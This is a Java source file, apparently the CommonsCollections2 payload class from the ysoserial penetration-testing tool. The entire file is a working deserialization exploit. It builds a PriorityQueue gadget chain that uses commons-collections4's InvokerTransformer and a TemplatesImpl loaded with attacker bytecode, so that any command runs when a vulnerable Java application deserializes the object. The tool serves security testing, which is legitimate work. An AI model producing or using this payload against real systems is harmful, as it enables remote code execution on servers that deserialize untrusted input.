@java.lang.SuppressWarnings({ "rawtypes", "unchecked", "restriction" })
@ysoserial.payloads.annotation.Dependencies({ "org.apache.commons:commons-collections4:4.0" })
public class CommonsCollections2 implements ysoserial.payloads.ObjectPayload<java.util.Queue<java.lang.Object>> {
	public java.util.Queue<java.lang.Object> getObject(final java.lang.String command) throws java.lang.Exception {
		final com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl templates = ysoserial.payloads.util.Gadgets.createTemplatesImpl(command);
		final org.apache.commons.collections4.functors.InvokerTransformer transformer = new org.apache.commons.collections4.functors.InvokerTransformer("toString", new java.lang.Class[0], new java.lang.Object[0]);
		final java.util.PriorityQueue<java.lang.Object> queue = new java.util.PriorityQueue<java.lang.Object>(2, new org.apache.commons.collections4.comparators.TransformingComparator(transformer));
		queue.add(1);
		queue.add(1);
		ysoserial.payloads.util.Reflections.setFieldValue(transformer, "iMethodName", "newTransformer");
		final java.lang.Object[] queueArray = ((java.lang.Object[]) (ysoserial.payloads.util.Reflections.getFieldValue(queue, "queue")));
		queueArray[0] = templates;
		queueArray[1] = 1;
		return queue;
	}

	public static void main(final java.lang.String[] args) throws java.lang.Exception {
		ysoserial.payloads.util.PayloadRunner.run(ysoserial.payloads.CommonsCollections2.class, args);
	}
}